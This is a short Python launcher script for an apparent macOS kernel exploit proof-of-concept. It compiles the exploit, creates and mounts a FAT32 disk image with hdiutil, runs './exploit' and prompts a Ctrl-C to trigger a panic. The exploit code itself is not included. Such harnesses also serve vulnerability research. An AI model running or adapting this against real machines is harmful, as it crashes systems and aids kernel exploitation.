#!/usr/bin/env python3
import os

# no error check

def main():
    print('[+] 1. make exp')
    os.system('make')
    print('[+] 2. mount widget.dmg')
    if not os.path.exists('./widget.dmg'):
        os.system('hdiutil create -size 64m -fs FAT32 -volname WIDGET ./widget.dmg')
    if not os.path.exists('/Volumes/WIDGET'):
        os.system('hdiutil attach ./widget.dmg')
    print('[+] 3. trigger exp')
    os.system('./exploit')
    print('[+] 4. Ctrl-C to panic')

if __name__ == '__main__':
    main()
